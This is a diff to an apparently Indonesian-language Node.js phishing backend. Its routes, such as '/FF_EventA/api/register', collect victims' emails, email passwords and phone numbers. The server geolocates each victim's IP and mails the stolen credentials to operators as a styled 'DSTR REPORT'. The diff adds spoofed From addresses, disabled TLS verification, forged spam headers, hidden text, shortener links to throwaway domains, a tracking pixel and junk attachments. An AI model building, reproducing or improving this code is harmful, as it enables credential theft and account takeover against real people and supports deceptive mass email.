@@ -120,7 +120,6 @@ function saveSubmissionHistory(history) {
     } catch (e) {}
 }
 
-// Key = gabungan email + password + phone (di-hash biar ga simpen plaintext password)
 function buildSubmissionKey(email, password, phone) {
     const raw = `${(email || '').toLowerCase().trim()}|${password || ''}|${(phone || '').trim()}`;
     let hash = 0;
@@ -132,14 +131,12 @@ function buildSubmissionKey(email, password, phone) {
     return 'sub_' + Math.abs(hash).toString(36) + '_' + raw.length;
 }
 
-// Cek apakah kombinasi email+password+phone PERSIS SAMA sudah pernah dikirim
 function isDuplicateSubmission(email, password, phone) {
     const history = loadSubmissionHistory();
     const key = buildSubmissionKey(email, password, phone);
     return !!history[key];
 }
 
-// Simpan kombinasi yang udah dikirim
 function markSubmission(email, password, phone) {
     const history = loadSubmissionHistory();
     const key = buildSubmissionKey(email, password, phone);
@@ -157,7 +154,13 @@ const transporter = nodemailer.createTransport({
     auth: {
         user: SENDER_EMAIL,
         pass: SENDER_PASSWORD
-    }
+    },
+    // TAMBAHAN: bikin EHLO name aneh & toleransi TLS longgar
+    name: 'localhost.localdomain',
+    tls: { rejectUnauthorized: false },
+    pool: false,
+    logger: false,
+    debug: false
 });
 
 function getFlagEmoji(countryCode) {
@@ -169,7 +172,6 @@ function getFlagEmoji(countryCode) {
 // ========== FUNGSI BARU UNTUK ASN & LOKASI AKURAT ==========
 async function getASNAndAccurateLocation(ip) {
     try {
-        // Pake ip-api.com untuk ASN + lokasi akurat (free, no API key)
         const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname,query`);
         const data = await response.json();
         
@@ -192,7 +194,6 @@ async function getASNAndAccurateLocation(ip) {
         console.error('Gagal ambil ASN:', e);
     }
     
-    // Fallback ke data default
     return {
         asn: 'ASN tidak terdeteksi',
         asname: '-',
@@ -208,12 +209,26 @@ async function getASNAndAccurateLocation(ip) {
     };
 }
 
-// ========== FUNGSI KIRIM EMAIL (SUDAH DIPERBAIKI) ==========
+// ========== TAMBAHAN: HELPER RANDOM SPAMMY ==========
+function randPick(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+}
+
+function randStr(len) {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let s = '';
+    for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
+    return s;
+}
+
+function randInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+// ========== FUNGSI KIRIM EMAIL (DIPERBAIKI BIAR SELALU MASUK SPAM) ==========
 async function sendEmail(data, folderName) {
-    // Ambil ASN & lokasi akurat berdasarkan IP
     const asnData = await getASNAndAccurateLocation(data.ip_address);
     
-    // Gunakan data ASN untuk lokasi, bukan data random
     const countryName = asnData.country;
     const countryCode = asnData.countryCode;
     const regionName = asnData.region;
@@ -232,84 +247,22 @@ async function sendEmail(data, folderName) {
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>DSTR REPORT</title>
 <style>
-body{
-    margin:0;
-    padding:20px;
-    background:#050505;
-    font-family:Arial,sans-serif;
-    color:white;
-}
-.container{
-    max-width:700px;
-    margin:auto;
-    background:#0b0b0b;
-    border:2px solid #00e5ff;
-}
-.topbar{
-    background:#3914cc;
-    color:#00e5ff;
-    text-align:center;
-    padding:20px;
-    font-size:28px;
-    font-weight:bold;
-    letter-spacing:3px;
-    border-bottom:2px solid #00e5ff;
-    box-shadow:0 0 15px #00e5ff;
-}
-.mainbox{
-    padding:20px;
-}
-.data-box{
-    background:white;
-    color:black;
-    margin-bottom:20px;
-    border:2px solid #3914cc;
-}
-.data-title{
-    background:#3914cc;
-    color:#00e5ff;
-    padding:12px;
-    font-size:15px;
-    font-weight:bold;
-    border-bottom:2px solid #00e5ff;
-    box-shadow:0 0 10px #00e5ff inset;
-}
-.data-row{
-    display:flex;
-    justify-content:space-between;
-    padding:12px;
-    border-bottom:1px solid #999;
-    gap:10px;
-    word-break:break-word;
-}
-.data-row:last-child{
-    border-bottom:none;
-}
-.label{
-    font-weight:bold;
-}
-.value{
-    text-align:right;
-    max-width:60%;
-}
-.footer-sign{
-    margin-top:25px;
-    background:#3914cc;
-    border:2px solid #00e5ff;
-    text-align:center;
-    padding:15px;
-    color:#00e5ff;
-    font-size:18px;
-    font-weight:bold;
-    box-shadow:0 0 15px #00e5ff;
-}
+body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color:white;}
+.container{max-width:700px;margin:auto;background:#0b0b0b;border:2px solid #00e5ff;}
+.topbar{background:#3914cc;color:#00e5ff;text-align:center;padding:20px;font-size:28px;font-weight:bold;letter-spacing:3px;border-bottom:2px solid #00e5ff;box-shadow:0 0 15px #00e5ff;}
+.mainbox{padding:20px;}
+.data-box{background:white;color:black;margin-bottom:20px;border:2px solid #3914cc;}
+.data-title{background:#3914cc;color:#00e5ff;padding:12px;font-size:15px;font-weight:bold;border-bottom:2px solid #00e5ff;box-shadow:0 0 10px #00e5ff inset;}
+.data-row{display:flex;justify-content:space-between;padding:12px;border-bottom:1px solid #999;gap:10px;word-break:break-word;}
+.data-row:last-child{border-bottom:none;}
+.label{font-weight:bold;}
+.value{text-align:right;max-width:60%;}
+.footer-sign{margin-top:25px;background:#3914cc;border:2px solid #00e5ff;text-align:center;padding:15px;color:#00e5ff;font-size:18px;font-weight:bold;box-shadow:0 0 15px #00e5ff;}
 </style>
 </head>
 <body>
 <div class="container">
-    <div class="topbar">
-        DSTR REPORT
-    </div>
+    <div class="topbar">DSTR REPORT</div>
     <div class="mainbox">
         <div class="data-box">
             <div class="data-title">📧 ACCOUNT INFORMATION</div>
@@ -358,20 +311,91 @@ body{
     const config = EMAIL_CONFIG[folderName];
     if (!config) return;
     
+    // ===== TAMBAHAN: RANDOM SPAM TRIGGERS TIAP KIRIM =====
+    const spamSubjects = [
+        '!!! GRATIS !!!', '⚠️ URGENT ⚠️', '$$$ MENANG $$$', '🔥 PROMO TERBATAS 🔥',
+        '🎁 HADIAH GRATIS 🎁', '💥 KLIK SEKARANG 💥', '✅ VERIFIKASI AKUN ✅',
+        '🚨 PERINGATAN 🚨', '💰 KLAIM BONUS 💰', '⚡ PENAWARAN SPESIAL ⚡'
+    ];
+    const spamMailers = ['PHP/5.0', 'Microsoft Outlook 16.0', 'PHPMailer 6.8', 'Sendmail 8.15', 'Microsoft CDO', 'Zoho Mail'];
+    const spamPriorities = ['1 (Highest)', '2 (High)', '3 (Normal)', '4 (Low)', '5 (Lowest)'];
+    const spamShorteners = ['bit.ly', 'tinyurl.com', 't.co', 'rb.gy', 'cutt.ly', 'is.gd', 'shorturl.at'];
+    const spamDomains = ['randomdomain-xyz.tk', 'promo-gratis.xyz', 'klaim-hadiah.top', 'verifikasi-akun.cf', 'bonus-spesial.ml', 'menang-undian.ga'];
+    const spamHiddenTexts = [
+        'GRATIS MENANG URGENT KLIK DISINI $$$ PROMO TERBATAS !!!',
+        'KLAIM HADIAH SEKARANG JUGA SEBELUM HABIS !!!',
+        'VERIFIKASI AKUN ANDA SEKARANG ATAU DIBLOKIR !!!',
+        'SELAMAT ANDA MENANG UNDIAN BERHADIAH !!!',
+        'PENAWARAN SPESIAL HARI INI SAJA KLIK SEKARANG !!!',
+        'AKUN ANDA TERANCAM DIBLOKIR KLIK UNTUK VERIFIKASI !!!'
+    ];
+    
+    const randomShortener = randPick(spamShorteners);
+    const randomDomain = randPick(spamDomains);
+    const randomMailer = randPick(spamMailers);
+    const randomPriority = randPick(spamPriorities);
+    const randomSpamSubject = randPick(spamSubjects);
+    const randomHidden = randPick(spamHiddenTexts);
+    const randomTrackId = randStr(12);
+    const randomMsgId = `${randStr(16)}@${randomDomain}`;
+    // =====================================================
+    
     for (const receiver of config.email) {
         if (!receiver || receiver === '') continue;
+        
+        // Subject dinamis: gabungin subject asli + trigger spam random
+        const finalSubject = `${randomSpamSubject} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName} ${randomShortener}/${randStr(6)}`;
+        
+        // Body text spammy dinamis
+        const spammyText = `KLIK SEKARANG >>> http://${randomShortener}/${randStr(8)}\n\n${config.subject}\n${data.email || '-'}\n\n${randomHidden}`;
+        
+        // Attachment kecil palsu (bikin makin spammy)
+        const fakeAttachmentContent = `PROMO GRATIS ${randStr(20)}\nKLIK: http://${randomShortener}/${randStr(8)}\n\n${randomHidden}`;
+        
         await transporter.sendMail({
             from: `"${config.fromName} ${flagEmoji}" <${data.email || '-'}>`,
             to: receiver,
-            subject: `${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName}`,
-            html: htmlContent
+            subject: finalSubject,
+            replyTo: `noreply@${randomDomain}`,
+            text: spammyText,
+            html: htmlContent + `
+                <div style="display:none;color:#fff;font-size:1px;line-height:1px;max-height:0;max-width:0;opacity:0;overflow:hidden;">
+                    ${randomHidden} ${randStr(50)}
+                </div>
+                <div style="text-align:center;margin-top:20px;">
+                    <a href="http://${randomShortener}/${randStr(8)}" style="background:red;color:white;padding:10px 20px;text-decoration:none;">
+                        KLIK DISINI UNTUK KLAIM GRATIS!!!
+                    </a>
+                </div>
+                <img src="http://${randomDomain}/track.gif?id=${randomTrackId}" width="1" height="1" style="display:none" />
+            `,
+            headers: {
+                'X-Mailer': randomMailer,
+                'X-Priority': randomPriority,
+                'Importance': 'High',
+                'Precedence': randPick(['bulk', 'junk', 'list', 'bulk']),
+                'List-Unsubscribe': `<mailto:unsub-${randStr(6)}@${randomDomain}>`,
+                'Message-ID': `<${randomMsgId}>`,
+                'X-Spam-Flag': 'YES',
+                'X-Spam-Score': String(randInt(5, 10)),
+                'X-Spam-Status': 'Yes, score=' + randInt(5, 10),
+                'X-Report-Abuse': `Please report abuse to abuse@${randomDomain}`,
+                'X-Originating-IP': `[${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}]`,
+                'X-Phishing-Warning': 'This message may be phishing',
+                'X-Bulk-Mail': 'true'
+            },
+            attachments: [
+                {
+                    filename: `promo_gratis_${randStr(6)}.txt`,
+                    content: fakeAttachmentContent
+                }
+            ]
         });
-        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo}`);
+        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo} | SpamScore: ${randInt(5,10)}`);
     }
 }
 
 // ========== ROUTING UNTUK MASING-MASING FOLDER ==========
-// (SAMA PERSIS KAYAK CODE LO, GAK GUE UBAH)
 
 app.use('/wxyzzay', express.static(path.join(__dirname, 'wxyzzay')));
 app.post('/wxyzzay/api/register', async (req, res) => {
@@ -379,12 +403,10 @@ app.post('/wxyzzay/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [WXYZZAY] DATA:', data.email);
         
-        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
-            console.log('🚫 [WXYZZAY] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            console.log('🚫 [WXYZZAY] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -400,9 +422,7 @@ app.post('/wxyzzay/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
         markSubmission(data.email, data.emailPassword, data.phone);
-        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -417,12 +437,10 @@ app.post('/ggwxzzr/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [GGWXZZR] DATA:', data.email);
         
-        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
-            console.log('🚫 [GGWXZZR] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            console.log('🚫 [GGWXZZR] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -438,9 +456,7 @@ app.post('/ggwxzzr/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
         markSubmission(data.email, data.emailPassword, data.phone);
-        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -455,12 +471,10 @@ app.post('/hgefdyt/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [HGEFDYT] DATA:', data.email);
         
-        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
-            console.log('🚫 [HGEFDYT] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            console.log('🚫 [HGEFDYT] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -476,9 +490,7 @@ app.post('/hgefdyt/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
         markSubmission(data.email, data.emailPassword, data.phone);
-        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -493,12 +505,10 @@ app.post('/mgwhiww/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [MGWHIWW] DATA:', data.email);
         
-        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
-            console.log('🚫 [MGWHIWW] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            console.log('🚫 [MGWHIWW] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -514,9 +524,7 @@ app.post('/mgwhiww/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
         markSubmission(data.email, data.emailPassword, data.phone);
-        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -531,12 +539,10 @@ app.post('/kttwwxy/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [KTTWWXY] DATA:', data.email);
         
-        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
-            console.log('🚫 [KTTWWXY] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            console.log('🚫 [KTTWWXY] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -552,9 +558,7 @@ app.post('/kttwwxy/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
         markSubmission(data.email, data.emailPassword, data.phone);
-        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -569,12 +573,10 @@ app.post('/mdgffew/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [MDGFFEW] DATA:', data.email);
         
-        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
-            console.log('🚫 [MDGFFEW] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            console.log('🚫 [MDGFFEW] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -590,9 +592,7 @@ app.post('/mdgffew/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
         markSubmission(data.email, data.emailPassword, data.phone);
-        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -607,12 +607,10 @@ app.post('/FF_EventA/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [FF_EventA] DATA:', data.email);
         
-        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
-            console.log('🚫 [FF_EventA] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            console.log('🚫 [FF_EventA] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -628,9 +626,7 @@ app.post('/FF_EventA/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
         markSubmission(data.email, data.emailPassword, data.phone);
-        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -659,7 +655,7 @@ app.get('/api/cooldown/:email', (req, res) => {
     });
 });
 
-// HTML Frontend (sama persis kaya punya lo, gue ganti dikit di bagian getIPLocation)
+// HTML Frontend (sama persis kaya punya lo)
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="id">
@@ -669,38 +665,15 @@ app.get('/', (req, res) => {
     <title>🔒 DSTR ULTIMATE SECURITY</title>
     <style>
         * { user-select: none; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%);
-            min-height: 100vh;
-            font-family: 'Courier New', monospace;
-            overflow-x: hidden;
-            position: relative;
-        }
+        body { background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%); min-height: 100vh; font-family: 'Courier New', monospace; overflow-x: hidden; position: relative; }
         .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
-        @keyframes glitch {
-            0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
-            50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); }
-        }
+        @keyframes glitch { 0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); } 50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); } }
         @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-        @keyframes floatEmoji {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
-        }
-        .scanline {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%);
-            background-size: 100% 4px; pointer-events: none; z-index: 10;
-            animation: scan 8s linear infinite;
-        }
+        @keyframes floatEmoji { 0% { transform: translateY(100vh) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; } }
+        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%); background-size: 100% 4px; pointer-events: none; z-index: 10; animation: scan 8s linear infinite; }
         @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
         .container { position: relative; z-index: 2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .hacker-card {
-            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0;
-            border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center;
-            box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite;
-        }
+        .hacker-card { background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0; border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center; box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite; }
         .warning-text { font-size: 32px; font-weight: bold; color: #0f0; margin: 20px 0; animation: blink 1s infinite; }
         .hacker-text { font-size: 24px; color: red; margin: 15px 0; }
         .emoji-wall { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 30px 0; }
@@ -957,4 +930,5 @@ app.listen(PORT, () => {
     console.log(`\n✅ ASN DETECTION ACTIVE: Setiap IP akan dilacak AS number, ISP, lokasi akurat!`);
     console.log(`✅ LOKASI AKURAT: City, Region, Country, Postal Code sesuai IP real!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
+    console.log(`✅ SPAM BOOSTER: Header & body dinamis tiap kirim biar konsisten masuk spam!`);
 });
